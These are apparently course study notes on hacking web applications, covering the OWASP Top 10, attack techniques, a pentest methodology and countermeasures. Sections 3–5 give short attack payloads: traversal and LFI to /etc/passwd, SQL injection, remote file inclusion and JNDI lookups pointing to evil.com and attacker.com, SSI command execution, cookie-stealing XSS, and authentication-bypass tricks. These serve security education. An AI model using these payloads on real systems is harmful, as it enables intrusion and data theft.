# Module 14 – Hacking Web Applications

> Status: ✅ Reference complete

## 1. Web application concepts
Browser-based apps using client-side (HTML/CSS/JS) + server-side (Java/C#/PHP/Ruby) scripts, talking to a database. **Flow:** user URL → browser → web server (static served directly; dynamic `.php`/`.asp` → app server → database → response).

**Architecture (3 layers):** client/presentation (browser) → business logic (web-server logic: Apache/IIS + business logic: Java/.NET) → database (MySQL/MSSQL).

**Web services:** apps communicating over the internet via SOAP (XML) or REST (HTTP). Architecture: provider / requester / registry (publish, find, bind). Components: UDDI (directory), WSDL (XML description), WS-Security. Types: SOAP (protocol) vs RESTful (architectural).

**Vulnerability stack (7 layers, top-down):** Web Applications → Third-Party Components → Web Server → Database → OS → Network → Security Devices (IDS/IPS). Attackers exploit any layer.

## 2. OWASP Top 10 (2021)
- **A01 Broken Access Control** — directory traversal, hidden-field manipulation, IDOR, force browsing, CORS misconfig, privilege escalation.
- **A02 Cryptographic Failures** (sensitive data exposure) — weak/no encryption (MD5/SHA-1), cookie snooping, RC4 NOMORE, pass-the-cookie.
- **A03 Injection** — SQLi, command, LDAP, XSS, buffer overflow.
- **A04 Insecure Design** — business-logic bypass, timing attacks, CAPTCHA attacks.
- **A05 Security Misconfiguration** — XXE, unvalidated redirects, directory traversal; unvalidated input, parameter/form tampering, improper error handling, insufficient TLS.
- **A06 Vulnerable & Outdated Components** — Magecart, platform exploits (check Exploit-DB/CXSecurity/ZDI).
- **A07 Identification & Authentication Failures** — CSRF, cookie/session poisoning, session ID in URL, password/timeout exploitation.
- **A08 Software & Data Integrity Failures** — insecure deserialization, watering hole.
- **A09 Security Logging & Monitoring Failures** — undetected attacks, log tampering.
- **A10 SSRF** — inject SSRF payload, XSPA (cross-site port attack), DNS rebinding, H2C smuggling.

## 3. Web application attacks
### Injection & input
- **Directory traversal:** `http://site/../../../../etc/passwd` — reach files outside web root.
- **Hidden field manipulation:** edit `<input type="hidden" name="PRICE" value="200.00">` to `2.00` (e-shoplifting).
- **SQL injection:** `SELECT * FROM t WHERE UserID=2302 OR 1=1` — bypass auth / dump data.
- **Command injection:** shell injection (`system()`, `exec()`), HTML embedding, file injection (`?COLOR=http://evil/exploit?`).
- **File injection (PHP RFI):** `require($drink.'.php')` → `?DRINK=http://evil.com/exploit?`.
- **LDAP injection:** input `certifiedhacker)(&)` → `(&(USER=certifiedhacker)(&))(PASS=blah))` — password check ignored (login bypass).
- **Server-side JS injection:** `eval()` abuse → `while(1)` DoS, `res.end(require('fs').readFileSync('file'))`.
- **SSI injection:** `<!--#exec cmd="cat /etc/passwd"-->`.
- **SSTI:** `{{system('ls')}}` in a template fed from user input → RCE.
- **Log injection:** inject `\r\n` (CRLF) or `%00` to forge/truncate log entries.
- **HTML injection:** inject `</h2>...<a href=evil>link</a><h2>` into reflected/stored output.
- **CRLF injection:** `%0d%0a` → HTTP response splitting, request smuggling, log forging.
- **JNDI injection:** `/lookup?name=ldap://attacker.com/Object` → Java loads malicious object → RCE.

### LFI (local file inclusion)
Vulnerable: `$file=$_GET['page']; require($file);` → `?page=../../../../etc/passwd`.
- Bypass appended `.php`: null byte `?page=../../etc/passwd%00` or `?page=../../etc/passwd?`.
- Read PHP source: `?page=php://filter/convert.base64-encode/resource=index` → `base64 -d savefile.php`.

### XSS
Injected script runs in victim's browser (steal cookies, hijack sessions, keylog). Delivered via email link, stored in blog/comment (`<script>alert(document.cookie)</script>`). **Filter evasion:** ASCII (`&#106;`), hex (`&#x6A;`), Base64 (`eval(atob(...))`), zero-padding, `String.fromCharCode(88,83,83)`, tabs/newlines in `java\tscript:`, case mix.

### Other
- **Timing attacks** (direct/cross-site/browser — video-parsing, cache-storage) — side-channel on response time.
- **XXE** — external entity reference reads `/etc/passwd`, SSRF, billion-laughs DoS.
- **Unvalidated redirects/forwards** — open redirection (header-based / JavaScript-based), session fixation, access-control bypass.
- **Magecart** (web skimming) — inject JS into checkout to steal card data.
- **Watering hole** — compromise a site the target frequents.
- **CSRF** — trick the victim's browser into a state-changing authenticated request.
- **Cookie/session poisoning** — modify cookie (often weakly Base64/ROT13-encoded) to impersonate.
- **Insecure deserialization** — inject malicious code into serialized data → executes on deserialize.
- **Clickjacking** — transparent iframe overlay (overlay, cropping, hidden, click-event dropping, rapid replacement); missing X-Frame-Options.
- **MarioNet** — abuse Service Workers + SyncManager for persistent browser botnet.
- **Web service attacks** — probing (WSDL), SOAP injection, SOAPAction spoofing (change header to `deleteAllUsers`), WS-Address spoofing, XML injection, parsing attacks (recursive/oversize payloads). Tools: WS-Attacker, SoapUI.
- **DNS rebinding** — short-TTL DNS flips to internal IP → bypass same-origin → reach internal resources.

## 4. Hacking methodology
### Footprint web infrastructure
Server discovery (WHOIS, DNS interrogation, port scanning), banner grabbing (`telnet site 80` then Esc; SSL: `openssl s_client -host site -port 443` then `GET / HTTP/1.0`). Web-server ports: 80, 443, 1433 (MSSQL), 7001 (WebLogic), 8080/8085 (Tomcat), 10000 (Netscape admin).
- **Proxy detection:** `TRACE / HTTP/1.1` — look for added `Via`/`Forwarded` headers.
- **WAF detection:** WAFW00F, WhatWaf; `nmap -p80,443 --script http-waf-detect`.
- **Hidden content:** web spidering/crawling (OWASP ZAP, Burp), user-directed spidering.
- **Load balancers:** `host <domain>`, `dig <domain>`, `lbd <domain>`.
- **Web app tech:** Wappalyzer, BuiltWith, WhatWeb.
- **WebSockets:** STEWS (`python3 STEWS-fingerprint.py -1 -k -u <URL>`).

### Analyze web applications
- Info gathering: extract links (Octoparse), wordlist (`cewl https://site`), metadata (ExifTool, Metagoofil), monitor updates (WebSite-Watcher), mirroring (`wget --mirror --convert-links --page-requisites --no-parent http://site` / `httrack`).
- Identify server-side tech: session tokens — JSESSIONID (Java), ASPSESSIONID (IIS), ASP.NET_SessionId, PHPSESSID; tools httprint, WhatWeb.
- Identify files/directories: `gobuster -u <URL> -w common.txt`, `nmap -sV --script=http-enum <target>`, dirb.
- Identify vulnerabilities: Vega, WPScan, Arachni, Uniscan, Sn1per.

### Bypass client-side controls
Attack hidden form fields (save HTML, edit price, reload — or Burp; try negative values for refunds), attack browser extensions (intercept with Burp / decompile), source code review.

### Attack authentication
- **Username enumeration:** verbose failure messages ("invalid username" vs "incorrect password"), predictable usernames (user101/user102). Burp automates.
- **Password attacks:** guessing, dictionary, brute-force (Burp Intruder), password-functionality exploits (change/recovery/"Remember Me").
- **Password reset poisoning:** send request with spoofed `Host: badhost.com` → reset link built from `HTTP_HOST` points to attacker → capture token.
- **Session attacks:** session ID prediction/brute-forcing (`JSESSIONID=user01`→`user02`), poisoning.
- **Cookie exploitation:** poisoning, sniffing, replay.
- **Bypass auth:** SAML SSO (SAML Raider — comment-inject the NameID so SP reads only the first part), rate limit (rotate IPs, `X-Forwarded-For` spoofing, blank chars `%0a`/`%00`, try endpoint variants), MFA (HTTP response-body manipulation `success:false`→`true`, status-code manipulation 403→200).
- **Design flaws:** bad passwords, brute-forcible login, verbose messages, insecure credential transmission, weak reset/forgotten-password/"Remember Me"/impersonation, improper validation, predictable creds.
- **Implementation flaws:** fail-open login (exception → logged in), multistage login flaws, insecure credential storage.

### Attack session management
Session-token prediction (deterministic pattern — weak hex/Base64 encoding, e.g. `user=jason;app=admin;date=...` hex-encoded), token tampering, MITM, hijacking, replay. Sniff tokens (Wireshark/Burp); if Secure flag unset, replay the cookie. Manipulate WebSocket traffic via Burp Repeater.

### Attack authorization & access controls
- **HTTP request tampering:** query string, Referer header (`Admin=false`→`true`), POST data, hidden tags.
- **Cookie parameter tampering:** collect → modify (Burp) → replay.
- **Insecure access controls:** parameter-based, Referer-based, location-based (bypass via proxy/VPN).
- **Methods:** different user accounts, multistage processes (swap tokens), static resources (direct URL), direct method/API access, HTTP method restrictions (GET/PUT/DELETE).

### Attack application logic & shared environments
- **Logic flaws:** forced browsing (skip payment stage via Burp).
- **Shared environments:** attack remote-access mechanism, attacks between applications (Perl CGI running `$command`).
- **Web app client:** XSS, HTTP header injection, request forgery, redirection, frame injection, session fixation, ActiveX attacks.

### Attack database connectivity
Connection strings (`Server=sql_box;Database=Common;User ID=uid;Pwd=password;`):
- **Connection string injection:** append `pwd; Encryption=off`.
- **CSPP (parameter pollution):** overwrite params — hash stealing (`Data Source=Rogue_Server; Integrated Security=true`), port scanning, hijacking web credentials.
- **Connection pool DoS:** 100 slow queries exhaust the pool (ASP.NET default 100/30s).

### Tools
Metasploit, w3af, Nikto, Sn1per, WSSiP, Web Brutator, HTTrack, WPScan, TIDoS-Framework. AI: ChatGPT-generated footprinting/vuln-scan scripts.

## 5. Web API & Webhooks
APIs: SOAP (XML/HTTP), REST/RESTful (stateless, cacheable, uniform interface, HTTP verbs), XML-RPC, JSON-RPC. **Webhooks** = user-defined HTTP callbacks (reverse APIs) pushing data on events.

**OWASP API Top 10:** API1 Broken Object-Level Authorization (BOLA), API2 Broken Authentication, API3 Broken Object Property-Level Authorization, API4 Unrestricted Resource Consumption, API5 Broken Function-Level Authorization, API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management, API10 Unsafe Consumption of APIs.

**API hacking methodology:** identify target (HTTP/message formats) → detect security standards (OAuth/SAML/SSL) → enumerate (Kiterunner: `kr scan https://target:8443/ -w routes.kite -A=apiroutes-...`) → identify attack surface (metadata — Swagger/WSDL, discovery, brute `/api/v2`) → analyze (Postman/ReqBin) → launch attacks:
- Fuzzing (Fuzzapi), invalid/malicious input (**XML bomb / billion laughs**), injection (`/api/v1/cust/ '%20or%20'1'='1`), insecure SSL/IDOR/session, credential stuffing (Sentry MBA), API DDoS.
- **OAuth attacks:** attack 'Connect' request, attack `redirect_uri` (XSS leaks the code), CSRF on authorization response, access-token reuse, SSRF via Dynamic Client Registration (`logo_uri`/`jwks_uri`/`request_uris`), WebFinger user enumeration, flawed scope validation.
- **Other:** reverse engineering, user spoofing, MITM (domain squatting), session replay, social engineering, **IDOR via parameter pollution** (`user_id=654&user_id=321`).

REST API scanners: Astra, Fuzzapi, w3af, AppSpider, OWASP ZAP.

## 6. Web application security (countermeasures)
### Testing
Manual + automated; **SAST** (white-box, source — Checkmarx, Snyk Code), **DAST** (black-box, running — Invicti, Acunetix), **fuzz testing** (mutation/generation/protocol-based — ffuf, Burp, WebScarab). AI-powered SAST/DAST/fuzzing (Code Genie, ZeroThreat.ai, Prompt Fuzzer).

### Encoding schemes
URL (`%3d`=`=`, `%20`=space), HTML (`&lt;`/`&gt;`/`&amp;`), Unicode (16-bit `%u2215`, UTF-8 `%c2%a9`), Base64, Hex. Application whitelisting (allow approved) vs blacklisting (block known-bad).

### Defenses by category
- **Injection (SQLi/command/LDAP/file/XSS/CRLF/SSTI):** validate + sanitize inputs (whitelist), **parameterized queries / prepared statements**, avoid dynamic SQL/`eval()`/direct OS commands, least privilege DB account, context-sensitive output encoding, CSP, disable `xp_cmdshell`/`allow_url_include`, WAF, limit input length.
- **Broken access control:** check permissions before access, deny by default, RBAC, unpredictable IDs, destroy tokens on logout, restrict CORS, security headers, MFA.
- **Cryptographic failures:** AES-256 + TLS 1.3/HSTS, HSM/KMS key management, bcrypt/scrypt/Argon2 for passwords, authenticated encryption (AES-GCM).
- **Insecure design:** threat modeling (OWASP Threat Dragon), secure SDLC, least privilege, defense in depth, fail securely, minimize attack surface.
- **Security misconfig:** disable unused services, lock down default accounts, patch, force HTTPS, CIS benchmarks.
- **XXE:** disable external entities + DTDs, secure parsers, XSD validation.
- **Broken auth/session:** HTTPS, hashed passwords, strong policy, login-attempt limits, MFA, long random session IDs invalidated on logout, generic errors, rate limiting + CAPTCHA.
- **SSRF:** URL/IP whitelist, block internal ranges, restrict schemes, disable redirects, WAF.
- **CSRF:** per-session CSRF tokens + server validation, SameSite cookies, custom headers, Origin/Referer check, re-auth for critical actions.
- **Clickjacking:** `X-Frame-Options: DENY/SAMEORIGIN`, CSP `frame-ancestors`.
- **WebSockets:** `wss://`, validate Origin, JWT auth, RBAC, message-size + rate limits, session timeouts.
- **API/Webhook:** HTTPS/TLS, auth tokens (OAuth2/JWT), rate limiting, input validation, API gateway (DMZ), least privilege; webhooks — HMAC signing, IP whitelist, replay prevention (timestamps), idempotency.

### Protection tech
- **WAF** — Cloudflare, Imperva, AppWall, Barracuda, NetScaler.
- **RASP** (Runtime Application Self-Protection) — built into the app, blocks attacks in real time.
- Testing tools: N-Stalker, Veracode, Invicti, HCL AppScan, Contrast Security.

> Flow: footprint infrastructure (WHOIS/banner/WAF/tech) → analyze the app (entry points, tech, files/dirs, vulns) → attack by category (bypass client controls, injection, auth/session/access-control, logic, DB connectivity, web services, API/OAuth). Defend with input validation + parameterized queries + output encoding, strong auth/session management, access control by default-deny + RBAC, security headers, WAF/RASP, and SAST/DAST/fuzz throughout a secure SDLC.
